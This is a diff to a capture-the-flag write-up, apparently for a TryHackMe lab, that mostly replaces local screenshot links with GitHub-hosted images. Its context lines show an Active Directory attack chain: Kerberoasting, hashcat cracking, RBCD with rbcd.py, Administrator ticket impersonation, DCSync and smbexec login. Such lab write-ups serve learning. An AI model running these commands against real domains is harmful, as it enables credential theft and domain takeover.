@@ -9,7 +9,7 @@ sed -i 's/sAMAccountName: //g' users.txt
 
 we can authenticate as guest:
 
-[![image.png](http://localhost:8080/uploads/images/gallery/2026-08/scaled-1680-/nYOimage.png)](http://localhost:8080/uploads/images/gallery/2026-08/nYOimage.png)
+![NXC LDAP](https://raw.githubusercontent.com/C0smicPrince/C0smicPrince.github.io/refs/heads/main/writeups/Images/OperationalEndgame/1.png)
 
 let's try Kerberoasting using:
 
@@ -19,7 +19,7 @@ impacket-GetUserSPNs thm.local/guest:'' -dc-ip $IP -request
 
 Output:
 
-[![image.png](http://localhost:8080/uploads/images/gallery/2026-08/scaled-1680-/0Tvimage.png)](http://localhost:8080/uploads/images/gallery/2026-08/0Tvimage.png)
+![Kerberosating](https://raw.githubusercontent.com/C0smicPrince/C0smicPrince.github.io/refs/heads/main/writeups/Images/OperationalEndgame/2.png)
 
 We have a hash now, crack it:
 
@@ -29,15 +29,11 @@ hashcat -m 13100 Kerberosating.txt ~/wordlist/rockyou.txt --show
 
 Output:
 
-[![image.png](http://localhost:8080/uploads/images/gallery/2026-08/scaled-1680-/vO5image.png)](http://localhost:8080/uploads/images/gallery/2026-08/vO5image.png)
+![3.png](https://raw.githubusercontent.com/C0smicPrince/C0smicPrince.github.io/refs/heads/main/writeups/Images/OperationalEndgame/3.png)
 
-Now using bloodhound collect data:
+Now using bloodhound collect data and now we can see guest holds rights over the DC:
 
-//
-
-Now we can see guest holds rights over the DC:
-
-[![image.png](http://localhost:8080/uploads/images/gallery/2026-08/scaled-1680-/V9Qimage.png)](http://localhost:8080/uploads/images/gallery/2026-08/V9Qimage.png)
+![4](https://raw.githubusercontent.com/C0smicPrince/C0smicPrince.github.io/refs/heads/main/writeups/Images/OperationalEndgame/4.png)
 
 now we can do RBCD attack:
 
@@ -47,7 +43,7 @@ rbcd.py THM.LOCAL/guest:"" -dc-ip 10.48.178.208 -delegate-to AD$ -delegate-from 
 
 Output:
 
-[![image.png](http://localhost:8080/uploads/images/gallery/2026-08/scaled-1680-/0Orimage.png)](http://localhost:8080/uploads/images/gallery/2026-08/0Orimage.png)
+![5](https://raw.githubusercontent.com/C0smicPrince/C0smicPrince.github.io/refs/heads/main/writeups/Images/OperationalEndgame/5.png)
 
 Now we will request the impersonated service ticket using CODY\_ROY's real credentials
 
@@ -57,7 +53,7 @@ impacket-getST -spn 'ldap/ad.thm.local' -impersonate 'Administrator' -dc-ip 10.4
 
 Output:
 
-[![image.png](http://localhost:8080/uploads/images/gallery/2026-08/scaled-1680-/a9uimage.png)](http://localhost:8080/uploads/images/gallery/2026-08/a9uimage.png)
+![6](https://raw.githubusercontent.com/C0smicPrince/C0smicPrince.github.io/refs/heads/main/writeups/Images/OperationalEndgame/6.png)
 
 Now we will DCSync with the resulting ticket:
 
@@ -68,7 +64,7 @@ impacket-secretsdump -k -no-pass -dc-ip 10.48.178.208 -just-dc-user Administrato
 
 Output:
 
-[![image.png](http://localhost:8080/uploads/images/gallery/2026-08/scaled-1680-/6Moimage.png)](http://localhost:8080/uploads/images/gallery/2026-08/6Moimage.png)
+![7](https://raw.githubusercontent.com/C0smicPrince/C0smicPrince.github.io/refs/heads/main/writeups/Images/OperationalEndgame/7.png)
 
 We are basically DA now, we can login and get the flag using:
 
@@ -78,7 +74,7 @@ impacket-smbexec -hashes ':Redacted' 'thm.local/Administrator@10.48.178.208'
 
 Output:
 
-[![image.png](http://localhost:8080/uploads/images/gallery/2026-08/scaled-1680-/86dimage.png)](http://localhost:8080/uploads/images/gallery/2026-08/86dimage.png)
+![8](https://raw.githubusercontent.com/C0smicPrince/C0smicPrince.github.io/refs/heads/main/writeups/Images/OperationalEndgame/8.png)
 
 you may view the flag via:
 
